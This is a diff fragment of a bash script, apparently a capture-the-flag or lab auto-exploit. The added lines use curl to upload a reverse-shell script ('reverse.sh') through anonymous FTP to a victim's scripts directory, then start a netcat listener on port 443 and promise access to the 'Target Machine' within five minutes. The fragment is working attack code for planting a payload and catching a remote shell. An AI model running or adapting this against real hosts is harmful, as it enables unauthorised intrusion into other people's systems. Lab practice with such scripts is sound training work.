@@ -36,9 +36,24 @@ else
 fi
 
 #Configuration of FTP Server
+server="$ip_victim"
+user="anonymous"
 
 #Route and name of local file
+local_file="reverse.sh"
 
 #Route and name of remote file in /scripts directory
+remote_file="scripts/reverse.sh"
 
 #FTP command to upload file
+echo -e "\n" | curl -u $user -T "$local_file" ftp://$server/$remote_file
+
+if [ $? -eq 0 ]; then
+  echo -e "${color_green}[+]${color_reset} Successful upload of reverse.sh"
+else
+  echo -e "${color_red}[+]${color_reset} Unsuccessful upload of reverse.sh"
+  exit 1
+fi
+
+echo -e "${color_yellow_2}In Listen Mode with Netcat, in minus of 5 minutes you should receive a response and gain access to the Target Machine"
+nc -nlvp 443
